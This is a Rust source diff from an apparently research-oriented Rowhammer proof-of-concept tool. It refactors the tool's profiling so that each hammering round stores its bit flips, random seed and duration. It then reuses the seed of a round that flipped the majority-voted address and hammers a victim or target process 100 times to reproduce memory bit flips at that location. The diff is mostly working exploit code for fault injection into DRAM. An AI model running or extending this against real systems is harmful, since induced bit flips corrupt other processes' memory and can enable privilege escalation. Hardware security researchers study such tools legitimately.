@@ -7,7 +7,10 @@ use std::{
 };
 
 use anyhow::bail;
-use bs_poc::{allocator::hugepage::HugepageAllocator, memory::BitFlip};
+use bs_poc::{
+    allocator::hugepage::HugepageAllocator,
+    memory::{BitFlip, Initializable},
+};
 use bs_poc::{
     allocator::{self, BuddyInfo, ConsecAlloc, ConsecAllocator, Mmap, Pfn},
     hammerer,
@@ -283,49 +286,57 @@ fn make_hammer<'a>(
 }
 
 #[derive(Debug)]
+struct RoundProfile {
+    bit_flips: Vec<BitFlip>,
+    seed: [u8; 32],
+    duration: Duration,
+}
+#[derive(Debug)]
 struct Profiling {
-    bit_flips: Vec<Vec<BitFlip>>,
-    durations: Vec<Duration>,
+    rounds: Vec<RoundProfile>,
 }
 
 /// Hammer a given memory region a number of times to profile for vulnerable addresses.
 fn hammer_profile(
     hammerer: &mut Hammerer,
     memory: &ConsecBlocks,
-    rounds: u64,
+    num_rounds: u64,
     progress: Option<MultiProgress>,
 ) -> Profiling {
-    let p = progress.as_ref().map(|p| p.add(ProgressBar::new(rounds)));
-    let mut bit_flips = vec![];
-    let mut durations = vec![];
+    let p = progress
+        .as_ref()
+        .map(|p| p.add(ProgressBar::new(num_rounds)));
+    let mut rounds = vec![];
     let mut victim = victim::MemCheck::new(memory);
 
-    for _ in 0..rounds {
+    for _ in 0..num_rounds {
         if let Some(p) = p.as_ref() {
             p.inc(1)
         }
         let start = std::time::Instant::now();
         let result = hammerer.hammer(&mut victim);
         let duration = std::time::Instant::now() - start;
-        durations.push(duration);
-        match result {
+        let bit_flips = match result {
             Ok(result) => {
                 info!(
                     "Profiling hammering round successful: {:?}",
                     result.victim_result
                 );
-                bit_flips.push(result.victim_result);
+                result.victim_result
             }
             Err(e) => {
                 warn!("Profiling hammering round not successful: {:?}", e);
-                bit_flips.push(vec![]);
+                vec![]
             }
-        }
+        };
+        let seed = victim.seed().expect("no seed");
+        rounds.push(RoundProfile {
+            bit_flips,
+            seed,
+            duration,
+        });
     }
-    Profiling {
-        bit_flips,
-        durations,
-    }
+    Profiling { rounds }
 }
 
 unsafe fn _main() -> anyhow::Result<()> {
@@ -395,17 +406,27 @@ unsafe fn _main() -> anyhow::Result<()> {
             args.profiling_rounds,
             Some(progress.clone()),
         );
+        let bit_flips = profiling
+            .rounds
+            .iter()
+            .flat_map(|r| r.bit_flips.iter())
+            .collect::<Vec<_>>();
         // write stats
         if let Some(stats_file) = &args.statistics {
             stats.push(HammerStatistic {
                 alloc_duration_millis: alloc_duration.as_millis(),
                 memory_regions: memory.consec_pfns().unwrap_or_default(),
                 hammer_durations_millis: profiling
-                    .durations
+                    .rounds
                     .iter()
-                    .map(|d| d.as_millis())
+                    .map(|r| r.duration.as_millis())
                     .collect(),
-                bit_flips: profiling.bit_flips.clone(),
+                bit_flips: profiling
+                    .rounds
+                    .iter()
+                    .map(|r| r.bit_flips.clone())
+                    .collect::<Vec<_>>()
+                    .clone(),
             });
             info!(
                 "Writing statistics to file {}",
@@ -415,21 +436,17 @@ unsafe fn _main() -> anyhow::Result<()> {
             serde_json::to_writer_pretty(&mut json_file, &stats)?;
             json_file.flush()?;
         }
-        if profiling.bit_flips.is_empty() {
+        if bit_flips.is_empty() {
             warn!("No vulnerable addresses found");
             memory.dealloc();
             continue;
         } else {
-            info!(
-                "Profiling done. Found bitflips in {:?}",
-                profiling.bit_flips
-            );
+            info!("Profiling done. Found bitflips in {:?}", bit_flips);
         }
         // Find address to use for injection by majority vote
-        let majority = profiling
-            .bit_flips
+        let majority = bit_flips
             .iter()
-            .flat_map(|bit_flips| bit_flips.iter().map(|bit_flip| bit_flip.addr))
+            .map(|b| b.addr)
             .fold(std::collections::HashMap::new(), |mut counts, addr| {
                 *counts.entry(addr).or_insert(0) += 1;
                 counts
@@ -450,6 +467,13 @@ unsafe fn _main() -> anyhow::Result<()> {
             (addr as *const u8).pfn().unwrap_or_default(),
             count
         );
+        // find round with flips in `addr`, get seed
+        let seed = profiling
+            .rounds
+            .iter()
+            .find(|r| r.bit_flips.iter().any(|b| b.addr == addr))
+            .expect("no round with flips in addr")
+            .seed;
         let addr = addr & !0xfff; // mask out the lowest 12 bits
 
         let victim = if args.target.is_empty() {
@@ -468,13 +492,16 @@ unsafe fn _main() -> anyhow::Result<()> {
         };
         match victim {
             Some(mut victim) => {
-                let result = hammer.hammer(&mut victim);
-                match result {
-                    Ok(result) => {
-                        info!("Hammering successful: {:?}", result.victim_result);
-                    }
-                    Err(e) => {
-                        warn!("Hammering not successful: {:?}", e);
+                for _ in 0..100 {
+                    memory.initialize(seed);
+                    let result = hammer.hammer(&mut victim);
+                    match result {
+                        Ok(result) => {
+                            info!("Hammering successful: {:?}", result.victim_result);
+                        }
+                        Err(e) => {
+                            warn!("Hammering not successful: {:?}", e);
+                        }
                     }
                 }
                 victim.stop();
